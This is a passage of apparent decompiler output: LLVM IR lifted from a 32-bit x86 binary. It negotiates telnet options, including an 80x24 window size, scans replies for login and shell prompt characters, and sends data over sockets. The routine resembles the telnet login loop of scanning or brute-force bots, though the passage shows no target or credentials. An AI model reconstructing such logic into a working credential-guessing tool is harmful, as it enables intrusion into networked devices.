  store i32 %v1_804edde, i32* %eax.global-to-local, align 4
  %v1_804eddf = load i32, i32* @esp, align 4
  %v2_804eddf = add i32 %v1_804eddf, 32
  %v3_804eddf = inttoptr i32 %v2_804eddf to i32*
  store i32 %v1_804edde, i32* %v3_804eddf, align 4
  %v0_804ede3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ede3 = add i32 %v0_804ede3, 1
  %v8_804ede3 = icmp eq i32 %v1_804ede3, 0
  store i32 %v1_804ede3, i32* %eax.global-to-local, align 4
  br i1 %v8_804ede3, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804edea

dec_label_pc_804edea:                             ; preds = %dec_label_pc_804edde
  %v0_804edea = load i32, i32* @esp, align 4
  %v1_804edea = add i32 %v0_804edea, 32
  %v2_804edea = inttoptr i32 %v1_804edea to i32*
  %v3_804edea = load i32, i32* %v2_804edea, align 4
  store i32 %v3_804edea, i32* @esi, align 4
  %tmp117 = icmp slt i32 %v3_804edea, 1
  br i1 %tmp117, label %dec_label_pc_804f058, label %dec_label_pc_804edf6

dec_label_pc_804edf6:                             ; preds = %dec_label_pc_804edea
  %v1_804edf9 = add i32 %v0_804edea, -16
  %v2_804edf9 = inttoptr i32 %v1_804edf9 to i32*
  store i32 4, i32* %v2_804edf9, align 4
  %v0_804edfb = call i32 @function_804f760()
  store i32 %v0_804edfb, i32* %eax.global-to-local, align 4
  %v0_804ee00 = load i32, i32* @esp, align 4
  %v1_804ee00 = inttoptr i32 %v0_804ee00 to i32*
  %v2_804ee00 = load i32, i32* %v1_804ee00, align 4
  store i32 %v2_804ee00, i32* %ecx.global-to-local, align 4
  %v3_804ee00 = add i32 %v0_804ee00, 4
  %v1_804ee01 = inttoptr i32 %v3_804ee00 to i32*
  %v2_804ee01 = load i32, i32* %v1_804ee01, align 4
  store i32 %v2_804ee01, i32* @ebx, align 4
  %v1_804ee02 = add i32 %v0_804ee00, 1888
  store i32 %v1_804ee02, i32* %eax.global-to-local, align 4
  store i32 %v1_804ee02, i32* %v1_804ee01, align 4
  store i32 4, i32* %v1_804ee00, align 4
  %v0_804ee0c = call i32 @function_804f6b0()
  store i32 %v0_804ee0c, i32* %eax.global-to-local, align 4
  %v0_804ee11 = load i32, i32* @esp, align 4
  %v1_804ee11 = add i32 %v0_804ee11, -4
  %v2_804ee11 = inttoptr i32 %v1_804ee11 to i32*
  store i32 16384, i32* %v2_804ee11, align 4
  %v1_804ee16 = add i32 %v0_804ee11, 1888
  %v2_804ee16 = inttoptr i32 %v1_804ee16 to i32*
  %v3_804ee16 = load i32, i32* %v2_804ee16, align 4
  store i32 %v3_804ee16, i32* %edx.global-to-local, align 4
  %v2_804ee1d = add i32 %v0_804ee11, -8
  %v3_804ee1d = inttoptr i32 %v2_804ee1d to i32*
  store i32 %v3_804ee16, i32* %v3_804ee1d, align 4
  %v2_804ee1e = add i32 %v0_804ee11, -12
  %v3_804ee1e = inttoptr i32 %v2_804ee1e to i32*
  store i32 %v0_804ee0c, i32* %v3_804ee1e, align 4
  %v0_804ee1f = load i32, i32* @edi, align 4
  %v1_804ee1f = add i32 %v0_804ee1f, 4
  %v2_804ee1f = inttoptr i32 %v1_804ee1f to i32*
  %v3_804ee1f = load i32, i32* %v2_804ee1f, align 4
  store i32 %v3_804ee1f, i32* %eax.global-to-local, align 4
  %v2_804ee22 = add i32 %v0_804ee11, -16
  %v3_804ee22 = inttoptr i32 %v2_804ee22 to i32*
  store i32 %v3_804ee1f, i32* %v3_804ee22, align 4
  %v0_804ee23 = call i32 @function_8050986()
  store i32 %v0_804ee23, i32* %eax.global-to-local, align 4
  %v0_804ee28 = load i32, i32* @esp, align 4
  %v1_804ee2b = add i32 %v0_804ee28, 28
  %v2_804ee2b = inttoptr i32 %v1_804ee2b to i32*
  store i32 16384, i32* %v2_804ee2b, align 4
  %v1_804ee30 = add i32 %v0_804ee28, 24
  %v2_804ee30 = inttoptr i32 %v1_804ee30 to i32*
  store i32 2, i32* %v2_804ee30, align 4
  %v1_804ee32 = add i32 %v0_804ee28, 20
  %v2_804ee32 = inttoptr i32 %v1_804ee32 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052baf.25 to i32), i32* %v2_804ee32, align 4
  %v0_804ee37 = load i32, i32* @edi, align 4
  %v1_804ee37 = add i32 %v0_804ee37, 4
  %v2_804ee37 = inttoptr i32 %v1_804ee37 to i32*
  %v3_804ee37 = load i32, i32* %v2_804ee37, align 4
  %v2_804ee3a = add i32 %v0_804ee28, 16
  %v3_804ee3a = inttoptr i32 %v2_804ee3a to i32*
  store i32 %v3_804ee37, i32* %v3_804ee3a, align 4
  %v0_804ee3b = call i32 @function_8050986()
  store i32 %v0_804ee3b, i32* %eax.global-to-local, align 4
  %v0_804ee40 = load i32, i32* @esp, align 4
  %v1_804ee40 = inttoptr i32 %v0_804ee40 to i32*
  store i32 4, i32* %v1_804ee40, align 4
  %v0_804ee47 = call i32 @function_804f6e0()
  store i32 %v0_804ee47, i32* %eax.global-to-local, align 4
  %v0_804ee4f = load i32, i32* @edi, align 4
  %v1_804ee4f = add i32 %v0_804ee4f, 12
  %v2_804ee4f = inttoptr i32 %v1_804ee4f to i32*
  store i32 8, i32* %v2_804ee4f, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804ee5b:                             ; preds = %dec_label_pc_804ea62
  %v1_804ee5b = add i32 %v0_804ea62, 24
  %v2_804ee5b = inttoptr i32 %v1_804ee5b to i32*
  %v3_804ee5b = load i32, i32* %v2_804ee5b, align 4
  %v1_804ee5e = add i32 %v3_804ee5b, -1
  store i32 %v1_804ee5e, i32* %eax.global-to-local, align 4
  %tmp118 = icmp slt i32 %v1_804ee5e, 1
  br i1 %tmp118, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804ee67

dec_label_pc_804ee67:                             ; preds = %dec_label_pc_804ee5b
  %v2_804ee67 = add i32 %v0_804ea62, 27
  %v3_804ee67 = add i32 %v2_804ee67, %v3_804ee5b
  %v4_804ee67 = inttoptr i32 %v3_804ee67 to i8*
  %v5_804ee67 = load i8, i8* %v4_804ee67, align 1
  %v6_804ee67 = zext i8 %v5_804ee67 to i32
  %v7_804ee67 = load i32, i32* @edx, align 4
  %v8_804ee67 = and i32 %v7_804ee67, -256
  %v9_804ee67 = or i32 %v8_804ee67, %v6_804ee67
  store i32 %v9_804ee67, i32* %edx.global-to-local, align 4
  switch i8 %v5_804ee67, label %dec_label_pc_804ee75 [
    i8 62, label %dec_label_pc_804ee99
    i8 58, label %dec_label_pc_804ee99
  ]

dec_label_pc_804ee75:                             ; preds = %dec_label_pc_804ee67, %dec_label_pc_804ee8b
  %v0_804ee84 = phi i32 [ %v1_804ee84, %dec_label_pc_804ee8b ], [ %v1_804ee5e, %dec_label_pc_804ee67 ]
  %v7_804ee8b = phi i32 [ %v9_804ee8b, %dec_label_pc_804ee8b ], [ %v9_804ee67, %dec_label_pc_804ee67 ]
  %v1_804ee75 = trunc i32 %v7_804ee8b to i8
  %v1_804ee75.off = add i8 %v1_804ee75, -35
  %switch148 = icmp ult i8 %v1_804ee75.off, 3
  br i1 %switch148, label %dec_label_pc_804ee99, label %dec_label_pc_804ee84

dec_label_pc_804ee84:                             ; preds = %dec_label_pc_804ee75
  %v1_804ee84 = add i32 %v0_804ee84, -1
  %v8_804ee84 = icmp eq i32 %v1_804ee84, 0
  store i32 %v1_804ee84, i32* %eax.global-to-local, align 4
  br i1 %v8_804ee84, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804ee8b

dec_label_pc_804ee8b:                             ; preds = %dec_label_pc_804ee84
  %v3_804ee8b = add i32 %v2_804ee67, %v0_804ee84
  %v4_804ee8b = inttoptr i32 %v3_804ee8b to i8*
  %v5_804ee8b = load i8, i8* %v4_804ee8b, align 1
  %v6_804ee8b = zext i8 %v5_804ee8b to i32
  %v8_804ee8b = and i32 %v7_804ee8b, -256
  %v9_804ee8b = or i32 %v6_804ee8b, %v8_804ee8b
  store i32 %v9_804ee8b, i32* %edx.global-to-local, align 4
  %v10_804ee8f = icmp ne i8 %v5_804ee8b, 58
  %v10_804ee94 = icmp eq i8 %v5_804ee8b, 62
  %v1_804ee97 = icmp eq i1 %v10_804ee94, false
  %or.cond145 = and i1 %v10_804ee8f, %v1_804ee97
  br i1 %or.cond145, label %dec_label_pc_804ee75, label %dec_label_pc_804ee99

dec_label_pc_804ee99:                             ; preds = %dec_label_pc_804ee75, %dec_label_pc_804ee8b, %dec_label_pc_804ee67, %dec_label_pc_804ee67
  %v0_804ee99 = phi i32 [ %v1_804ee5e, %dec_label_pc_804ee67 ], [ %v1_804ee5e, %dec_label_pc_804ee67 ], [ %v0_804ee84, %dec_label_pc_804ee75 ], [ %v1_804ee84, %dec_label_pc_804ee8b ]
  %v1_804ee99 = add i32 %v0_804ee99, 1
  store i32 %v1_804ee99, i32* %eax.global-to-local, align 4
  %v1_804ee9a = load i32, i32* @esp, align 4
  %v2_804ee9a = add i32 %v1_804ee9a, 32
  %v3_804ee9a = inttoptr i32 %v2_804ee9a to i32*
  store i32 %v1_804ee99, i32* %v3_804ee9a, align 4
  %v0_804ee9e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ee9e = add i32 %v0_804ee9e, 1
  %v8_804ee9e = icmp eq i32 %v1_804ee9e, 0
  store i32 %v1_804ee9e, i32* %eax.global-to-local, align 4
  br i1 %v8_804ee9e, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804eea5

dec_label_pc_804eea5:                             ; preds = %dec_label_pc_804ee99
  %v0_804eea5 = load i32, i32* @esp, align 4
  %v1_804eea5 = add i32 %v0_804eea5, 32
  %v2_804eea5 = inttoptr i32 %v1_804eea5 to i32*
  %v3_804eea5 = load i32, i32* %v2_804eea5, align 4
  store i32 %v3_804eea5, i32* %eax.global-to-local, align 4
  %tmp119 = icmp slt i32 %v3_804eea5, 1
  br i1 %tmp119, label %dec_label_pc_804f058, label %dec_label_pc_804eeb1

dec_label_pc_804eeb1:                             ; preds = %dec_label_pc_804eea5
  %v1_804eeb4 = add i32 %v0_804eea5, -16
  %v2_804eeb4 = inttoptr i32 %v1_804eeb4 to i32*
  store i32 8, i32* %v2_804eeb4, align 4
  %v0_804eeb6 = call i32 @function_804f760()
  store i32 %v0_804eeb6, i32* %eax.global-to-local, align 4
  %v0_804eebb = load i32, i32* @esp, align 4
  %v1_804eebb = inttoptr i32 %v0_804eebb to i32*
  %v3_804eebb = add i32 %v0_804eebb, 4
  %v1_804eebc = inttoptr i32 %v3_804eebb to i32*
  %v2_804eebc = load i32, i32* %v1_804eebc, align 4
  store i32 %v2_804eebc, i32* %eax.global-to-local, align 4
  %v1_804eebd = add i32 %v0_804eebb, 1880
  store i32 %v1_804eebd, i32* %edx.global-to-local, align 4
  store i32 %v1_804eebd, i32* %v1_804eebc, align 4
  store i32 8, i32* %v1_804eebb, align 4
  %v0_804eec7 = call i32 @function_804f6b0()
  store i32 %v0_804eec7, i32* %eax.global-to-local, align 4
  %v0_804eecc = load i32, i32* @esp, align 4
  %v1_804eecc = add i32 %v0_804eecc, -4
  %v2_804eecc = inttoptr i32 %v1_804eecc to i32*
  store i32 16384, i32* %v2_804eecc, align 4
  %v1_804eed1 = add i32 %v0_804eecc, 1880
  %v2_804eed1 = inttoptr i32 %v1_804eed1 to i32*
  %v3_804eed1 = load i32, i32* %v2_804eed1, align 4
  store i32 %v3_804eed1, i32* @esi, align 4
  %v2_804eed8 = add i32 %v0_804eecc, -8
  %v3_804eed8 = inttoptr i32 %v2_804eed8 to i32*
  store i32 %v3_804eed1, i32* %v3_804eed8, align 4
  %v2_804eed9 = add i32 %v0_804eecc, -12
  %v3_804eed9 = inttoptr i32 %v2_804eed9 to i32*
  store i32 %v0_804eec7, i32* %v3_804eed9, align 4
  %v0_804eeda = load i32, i32* @edi, align 4
  %v1_804eeda = add i32 %v0_804eeda, 4
  %v2_804eeda = inttoptr i32 %v1_804eeda to i32*
  %v3_804eeda = load i32, i32* %v2_804eeda, align 4
  store i32 %v3_804eeda, i32* @ebx, align 4
  %v2_804eedd = add i32 %v0_804eecc, -16
  %v3_804eedd = inttoptr i32 %v2_804eedd to i32*
  store i32 %v3_804eeda, i32* %v3_804eedd, align 4
  %v0_804eede = call i32 @function_8050986()
  store i32 %v0_804eede, i32* %eax.global-to-local, align 4
  %v0_804eee3 = load i32, i32* @esp, align 4
  %v1_804eee6 = add i32 %v0_804eee3, 28
  %v2_804eee6 = inttoptr i32 %v1_804eee6 to i32*
  store i32 16384, i32* %v2_804eee6, align 4
  %v1_804eeeb = add i32 %v0_804eee3, 24
  %v2_804eeeb = inttoptr i32 %v1_804eeeb to i32*
  store i32 2, i32* %v2_804eeeb, align 4
  %v1_804eeed = add i32 %v0_804eee3, 20
  %v2_804eeed = inttoptr i32 %v1_804eeed to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052baf.25 to i32), i32* %v2_804eeed, align 4
  %v0_804eef2 = load i32, i32* @edi, align 4
  %v1_804eef2 = add i32 %v0_804eef2, 4
  %v2_804eef2 = inttoptr i32 %v1_804eef2 to i32*
  %v3_804eef2 = load i32, i32* %v2_804eef2, align 4
  store i32 %v3_804eef2, i32* %ecx.global-to-local, align 4
  %v2_804eef5 = add i32 %v0_804eee3, 16
  %v3_804eef5 = inttoptr i32 %v2_804eef5 to i32*
  store i32 %v3_804eef2, i32* %v3_804eef5, align 4
  %v0_804eef6 = call i32 @function_8050986()
  store i32 %v0_804eef6, i32* %eax.global-to-local, align 4
  %v0_804eefb = load i32, i32* @esp, align 4
  %v1_804eefb = inttoptr i32 %v0_804eefb to i32*
  store i32 8, i32* %v1_804eefb, align 4
  %v0_804ef02 = call i32 @function_804f6e0()
  store i32 %v0_804ef02, i32* %eax.global-to-local, align 4
  %v0_804ef0a = load i32, i32* @edi, align 4
  %v1_804ef0a = add i32 %v0_804ef0a, 12
  %v2_804ef0a = inttoptr i32 %v1_804ef0a to i32*
  store i32 10, i32* %v2_804ef0a, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804ef16:                             ; preds = %dec_label_pc_804ea99
  %v1_804ef16 = add i32 %v1_804ef20, 32
  %v2_804ef16 = inttoptr i32 %v1_804ef16 to i32*
  %v3_804ef16 = load i32, i32* %v2_804ef16, align 4
  %v1_804ef1a = add i32 %v0_804ea87, 2
  store i32 %v1_804ef1a, i32* @ebx, align 4
  %v1_804ef1d = add i32 %v3_804ef16, 2
  store i32 %v1_804ef1d, i32* %esi.global-to-local, align 4
  store i32 %v1_804ef1d, i32* %v2_804ef16, align 4
  %v4_804ea81.pre.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804ea81.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ea81.backedge

dec_label_pc_804ef29:                             ; preds = %dec_label_pc_804eac5
  store i8 -4, i8* %v2_804eac5, align 1
  br label %dec_label_pc_804ead8

dec_label_pc_804ef32:                             ; preds = %dec_label_pc_804eab3
  store i8 -4, i8* %v1_804eab3, align 1
  br label %dec_label_pc_804eac5

dec_label_pc_804ef3a:                             ; preds = %dec_label_pc_804ea99
  %v1_804ef3a = add i32 %v1_804ef20, 1879
  %v2_804ef3a = inttoptr i32 %v1_804ef3a to i8*
  store i8 -1, i8* %v2_804ef3a, align 1
  %v0_804ef42 = load i32, i32* @esp, align 4
  %v1_804ef42 = add i32 %v0_804ef42, 1880
  %v2_804ef42 = inttoptr i32 %v1_804ef42 to i8*
  store i8 -5, i8* %v2_804ef42, align 1
  %v0_804ef4a = load i32, i32* @esp, align 4
  %v1_804ef4a = add i32 %v0_804ef4a, 1881
  %v2_804ef4a = inttoptr i32 %v1_804ef4a to i8*
  store i8 31, i8* %v2_804ef4a, align 1
  %v0_804ef52 = load i32, i32* @esp, align 4
  %v1_804ef52 = add i32 %v0_804ef52, 1847
  %v2_804ef52 = inttoptr i32 %v1_804ef52 to i8*
  store i8 -1, i8* %v2_804ef52, align 1
  %v0_804ef5a = load i32, i32* @esp, align 4
  %v1_804ef5a = add i32 %v0_804ef5a, 1848
  %v2_804ef5a = inttoptr i32 %v1_804ef5a to i8*
  store i8 -6, i8* %v2_804ef5a, align 1
  %v0_804ef62 = load i32, i32* @esp, align 4
  %v1_804ef62 = add i32 %v0_804ef62, 1849
  %v2_804ef62 = inttoptr i32 %v1_804ef62 to i8*
  store i8 31, i8* %v2_804ef62, align 1
  %v0_804ef6a = load i32, i32* @esp, align 4
  %v1_804ef6a = add i32 %v0_804ef6a, 1850
  %v2_804ef6a = inttoptr i32 %v1_804ef6a to i8*
  store i8 0, i8* %v2_804ef6a, align 1
  %v0_804ef72 = load i32, i32* @esp, align 4
  %v1_804ef72 = add i32 %v0_804ef72, 1851
  %v2_804ef72 = inttoptr i32 %v1_804ef72 to i8*
  store i8 80, i8* %v2_804ef72, align 1
  %v0_804ef7a = load i32, i32* @esp, align 4
  %v1_804ef7a = add i32 %v0_804ef7a, 1852
  %v2_804ef7a = inttoptr i32 %v1_804ef7a to i8*
  store i8 0, i8* %v2_804ef7a, align 1
  %v0_804ef82 = load i32, i32* @esp, align 4
  %v1_804ef82 = add i32 %v0_804ef82, 1853
  %v2_804ef82 = inttoptr i32 %v1_804ef82 to i8*
  store i8 24, i8* %v2_804ef82, align 1
  %v0_804ef8a = load i32, i32* @esp, align 4
  %v1_804ef8a = add i32 %v0_804ef8a, 1854
  %v2_804ef8a = inttoptr i32 %v1_804ef8a to i8*
  store i8 -1, i8* %v2_804ef8a, align 1
  %v0_804ef92 = load i32, i32* @esp, align 4
  %v1_804ef92 = add i32 %v0_804ef92, 1855
  %v2_804ef92 = inttoptr i32 %v1_804ef92 to i8*
  store i8 -16, i8* %v2_804ef92, align 1
  %v0_804ef9a = load i32, i32* @esp, align 4
  %v1_804ef9a = add i32 %v0_804ef9a, 16
  %v2_804ef9a = inttoptr i32 %v1_804ef9a to i32*
  %v3_804ef9a = load i32, i32* %v2_804ef9a, align 4
  store i32 %v3_804ef9a, i32* %eax.global-to-local, align 4
  %v0_804ef9e = load i32, i32* @edi, align 4
  %v1_804ef9e = add i32 %v0_804ef9e, 24
  %v2_804ef9e = inttoptr i32 %v1_804ef9e to i32*
  %v3_804ef9e = load i32, i32* %v2_804ef9e, align 4
  store i32 %v3_804ef9e, i32* %ecx.global-to-local, align 4
  %v0_804efa1 = load i32, i32* @ebx, align 4
  %v1_804efa1 = add i32 %v0_804efa1, 2
  store i32 %v1_804efa1, i32* %edx.global-to-local, align 4
  %v2_804efa4 = add i32 %v3_804ef9e, %v3_804ef9a
  store i32 %v2_804efa4, i32* %eax.global-to-local, align 4
  %tmp270 = icmp ugt i32 %v2_804efa4, %v1_804efa1
  br i1 %tmp270, label %dec_label_pc_804efae, label %dec_label_pc_804eb03

dec_label_pc_804efae:                             ; preds = %dec_label_pc_804ef3a
  %v2_804efae = inttoptr i32 %v1_804efa1 to i8*
  %v3_804efae = load i8, i8* %v2_804efae, align 1
  %v12_804efae = icmp eq i8 %v3_804efae, 31
  br i1 %v12_804efae, label %dec_label_pc_804f422, label %dec_label_pc_804efb8

dec_label_pc_804efb8:                             ; preds = %dec_label_pc_804efae
  %v1_804efb8 = inttoptr i32 %v0_804efa1 to i8*
  %v2_804efb8 = load i8, i8* %v1_804efb8, align 1
  %v3_804efb8 = zext i8 %v2_804efb8 to i32
  %v5_804efb8 = and i32 %v2_804efa4, -256
  %v6_804efb8 = or i32 %v3_804efb8, %v5_804efb8
  store i32 %v6_804efb8, i32* %eax.global-to-local, align 4
  %v11_804efba = icmp eq i8 %v2_804efb8, -3
  %v1_804efbc = icmp eq i1 %v11_804efba, false
  br i1 %v1_804efbc, label %dec_label_pc_804f4f3, label %dec_label_pc_804efc2

dec_label_pc_804efc2:                             ; preds = %dec_label_pc_804efb8
  store i8 -4, i8* %v1_804efb8, align 1
  br label %dec_label_pc_804eab3

dec_label_pc_804efca:                             ; preds = %dec_label_pc_804ea0b
  %v1_804ea38 = icmp eq i32 %v0_804ea30, 0
  br i1 %v1_804ea38, label %dec_label_pc_804f49c, label %dec_label_pc_804efd0

dec_label_pc_804efd0:                             ; preds = %dec_label_pc_804efca
  %v10_804efd0 = icmp eq i32 %v0_804ea30, -1
  %v1_804efd3 = icmp eq i1 %v10_804efd0, false
  br i1 %v1_804efd3, label %dec_label_pc_804ea52, label %dec_label_pc_804efd9

dec_label_pc_804efd9:                             ; preds = %dec_label_pc_804efd0
  %v1_804efd9 = add i32 %v0_804ea35, 56
  %v2_804efd9 = inttoptr i32 %v1_804efd9 to i32*
  %v3_804efd9 = load i32, i32* %v2_804efd9, align 4
  store i32 %v3_804efd9, i32* %edx.global-to-local, align 4
  %v1_804efdd = inttoptr i32 %v3_804efd9 to i32*
  %v2_804efdd = load i32, i32* %v1_804efdd, align 4
  %v11_804efdd = icmp eq i32 %v2_804efdd, 11
  br i1 %v11_804efdd, label %dec_label_pc_804e8fd, label %dec_label_pc_804efe6

dec_label_pc_804efe6:                             ; preds = %dec_label_pc_804efd9, %dec_label_pc_804f49c
  %v0_804efe6 = phi i32 [ %v1_804ea35, %dec_label_pc_804efd9 ], [ %v0_804efe6.pre, %dec_label_pc_804f49c ]
  %v0_804efe9 = load i32, i32* @edi, align 4
  %v1_804efe9 = add i32 %v0_804efe9, 4
  %v2_804efe9 = inttoptr i32 %v1_804efe9 to i32*
  %v3_804efe9 = load i32, i32* %v2_804efe9, align 4
  store i32 %v3_804efe9, i32* %eax.global-to-local, align 4
  %v2_804efec = add i32 %v0_804efe6, -16
  %v3_804efec = inttoptr i32 %v2_804efec to i32*
  store i32 %v3_804efe9, i32* %v3_804efec, align 4
  %v1_804efed = call i32 @function_8050253(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804efed, i32* %eax.global-to-local, align 4
  %v0_804eff2 = load i32, i32* @edi, align 4
  %v1_804eff2 = add i32 %v0_804eff2, 284
  %v2_804eff2 = inttoptr i32 %v1_804eff2 to i8*
  %v3_804eff2 = load i8, i8* %v2_804eff2, align 1
  %v4_804eff2 = zext i8 %v3_804eff2 to i32
  %v6_804eff2 = and i32 %v1_804efed, -256
  %v7_804eff2 = or i32 %v4_804eff2, %v6_804eff2
  %v1_804effb = add i32 %v7_804eff2, 1
  store i32 %v1_804effb, i32* %eax.global-to-local, align 4
  %v1_804effc = add i32 %v0_804eff2, 4
  %v2_804effc = inttoptr i32 %v1_804effc to i32*
  store i32 -1, i32* %v2_804effc, align 4
  %v0_804f003 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f003 = trunc i32 %v0_804f003 to i8
  %v2_804f003 = load i32, i32* @edi, align 4
  %v3_804f003 = add i32 %v2_804f003, 284
  %v4_804f003 = inttoptr i32 %v3_804f003 to i8*
  store i8 %v1_804f003, i8* %v4_804f003, align 1
  %v0_804f009 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f009 = trunc i32 %v0_804f009 to i8
  %tmp271 = icmp ult i8 %v1_804f009, 10
  %v0_804f4ab = load i32, i32* @edi, align 4
  br i1 %tmp271, label %dec_label_pc_804f4ab, label %dec_label_pc_804f011

dec_label_pc_804f011:                             ; preds = %dec_label_pc_804efe6
  %v1_804f011 = add i32 %v0_804f4ab, 284
  %v2_804f011 = inttoptr i32 %v1_804f011 to i8*
  store i8 0, i8* %v2_804f011, align 1
  %v0_804f018 = load i32, i32* @edi, align 4
  %v1_804f018 = add i32 %v0_804f018, 12
  %v2_804f018 = inttoptr i32 %v1_804f018 to i32*
  store i32 0, i32* %v2_804f018, align 4
  br label %dec_label_pc_804e8fd

dec_label_pc_804f024:                             ; preds = %dec_label_pc_804eab3
  store i8 -3, i8* %v1_804eab3, align 1
  br label %dec_label_pc_804eac5

dec_label_pc_804f02c:                             ; preds = %dec_label_pc_804eac5
  store i8 -3, i8* %v2_804eac5, align 1
  br label %dec_label_pc_804ead8

dec_label_pc_804f035:                             ; preds = %dec_label_pc_804e9f7
  %v0_804f035 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804f035, i32* %edx.global-to-local, align 4
  %v1_804f037 = load i32, i32* @esp, align 4
  %v2_804f037 = add i32 %v1_804f037, -4
  %v3_804f037 = inttoptr i32 %v2_804f037 to i32*
  store i32 %v0_804f035, i32* %v3_804f037, align 4
  %v0_804f038 = load i32, i32* @edi, align 4
  %v1_804f038 = add i32 %v0_804f038, 92
  store i32 %v1_804f038, i32* %eax.global-to-local, align 4
  %v1_804f03b = add i32 %v1_804f037, -8
  %v2_804f03b = inttoptr i32 %v1_804f03b to i32*
  store i32 192, i32* %v2_804f03b, align 4
  %v0_804f040 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f040 = add i32 %v1_804f037, -12
  %v3_804f040 = inttoptr i32 %v2_804f040 to i32*
  store i32 %v0_804f040, i32* %v3_804f040, align 4
  %v0_804f041 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f041 = add i32 %v1_804f037, -16
  %v3_804f041 = inttoptr i32 %v2_804f041 to i32*
  store i32 %v0_804f041, i32* %v3_804f041, align 4
  %v4_804f042 = call i32 @function_80507b5(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f042, i32* %eax.global-to-local, align 4
  %v0_804f047 = load i32, i32* @edi, align 4
  %v1_804f047 = add i32 %v0_804f047, 24
  %v2_804f047 = inttoptr i32 %v1_804f047 to i32*
  %v3_804f047 = load i32, i32* %v2_804f047, align 4
  %v1_804f04a = add i32 %v3_804f047, -64
  store i32 %v1_804f04a, i32* %eax.global-to-local, align 4
  store i32 %v1_804f04a, i32* %v2_804f047, align 4
  br label %dec_label_pc_804ea0b

dec_label_pc_804f058:                             ; preds = %dec_label_pc_804eea5, %dec_label_pc_804edea, %dec_label_pc_804f3cc, %dec_label_pc_804ec7a, %dec_label_pc_804f1ae, %dec_label_pc_804f07c, %dec_label_pc_804f158, %dec_label_pc_804f2e7, %dec_label_pc_804eb03
  %v0_804f058 = phi i32 [ %v0_804eea5, %dec_label_pc_804eea5 ], [ %v0_804edea, %dec_label_pc_804edea ], [ %v1_804f3be, %dec_label_pc_804f3cc ], [ %v0_804ec7a, %dec_label_pc_804ec7a ], [ %v0_804f1ae, %dec_label_pc_804f1ae ], [ %v0_804f07c, %dec_label_pc_804f07c ], [ %v0_804f168, %dec_label_pc_804f158 ], [ %v0_804f2f7, %dec_label_pc_804f2e7 ], [ %v0_804eb03, %dec_label_pc_804eb03 ]
  %v1_804f058 = add i32 %v0_804f058, 32
  %v2_804f058 = inttoptr i32 %v1_804f058 to i32*
  %v3_804f058 = load i32, i32* %v2_804f058, align 4
  %v1_804f05c = icmp eq i32 %v3_804f058, 0
  %v1_804f05e = icmp eq i1 %v1_804f05c, false
  br i1 %v1_804f05e, label %dec_label_pc_804ed71, label %dec_label_pc_804e9ec.backedge

dec_label_pc_804f070:                             ; preds = %dec_label_pc_804ebac, %dec_label_pc_804ebac, %dec_label_pc_804ebac, %dec_label_pc_804ebac, %dec_label_pc_804ebac
  %v1_804f070 = add i32 %v0_804f070, 1
  store i32 %v1_804f070, i32* %eax.global-to-local, align 4
  %v1_804f071 = load i32, i32* @esp, align 4
  %v2_804f071 = add i32 %v1_804f071, 32
  %v3_804f071 = inttoptr i32 %v2_804f071 to i32*
  store i32 %v1_804f070, i32* %v3_804f071, align 4
  %v0_804f075 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f075 = add i32 %v0_804f075, 1
  %v8_804f075 = icmp eq i32 %v1_804f075, 0
  store i32 %v1_804f075, i32* %eax.global-to-local, align 4
  br i1 %v8_804f075, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804f07c

dec_label_pc_804f07c:                             ; preds = %dec_label_pc_804f070
  %v0_804f07c = load i32, i32* @esp, align 4
  %v1_804f07c = add i32 %v0_804f07c, 32
  %v2_804f07c = inttoptr i32 %v1_804f07c to i32*
  %v3_804f07c = load i32, i32* %v2_804f07c, align 4
  store i32 %v3_804f07c, i32* @esi, align 4
  %tmp120 = icmp slt i32 %v3_804f07c, 1
  br i1 %tmp120, label %dec_label_pc_804f058, label %dec_label_pc_804f084

dec_label_pc_804f084:                             ; preds = %dec_label_pc_804f07c
  %v1_804f087 = add i32 %v0_804f07c, -16
  %v2_804f087 = inttoptr i32 %v1_804f087 to i32*
  store i32 5, i32* %v2_804f087, align 4
  %v0_804f089 = call i32 @function_804f760()
  store i32 %v0_804f089, i32* %eax.global-to-local, align 4
  %v0_804f08e = load i32, i32* @esp, align 4
  %v1_804f08e = inttoptr i32 %v0_804f08e to i32*
  %v2_804f08e = load i32, i32* %v1_804f08e, align 4
  store i32 %v2_804f08e, i32* %ecx.global-to-local, align 4
  %v3_804f08e = add i32 %v0_804f08e, 4
  %v1_804f08f = inttoptr i32 %v3_804f08e to i32*
  %v2_804f08f = load i32, i32* %v1_804f08f, align 4
  store i32 %v2_804f08f, i32* @ebx, align 4
  %v1_804f090 = add i32 %v0_804f08e, 1880
  store i32 %v1_804f090, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f090, i32* %v1_804f08f, align 4
  store i32 5, i32* %v1_804f08e, align 4
  %v0_804f09a = call i32 @function_804f6b0()
  store i32 %v0_804f09a, i32* %eax.global-to-local, align 4
  %v0_804f09f = load i32, i32* @esp, align 4
  %v1_804f09f = add i32 %v0_804f09f, -4
  %v2_804f09f = inttoptr i32 %v1_804f09f to i32*
  store i32 16384, i32* %v2_804f09f, align 4
  %v1_804f0a4 = add i32 %v0_804f09f, 1880
  %v2_804f0a4 = inttoptr i32 %v1_804f0a4 to i32*
  %v3_804f0a4 = load i32, i32* %v2_804f0a4, align 4
  store i32 %v3_804f0a4, i32* %edx.global-to-local, align 4
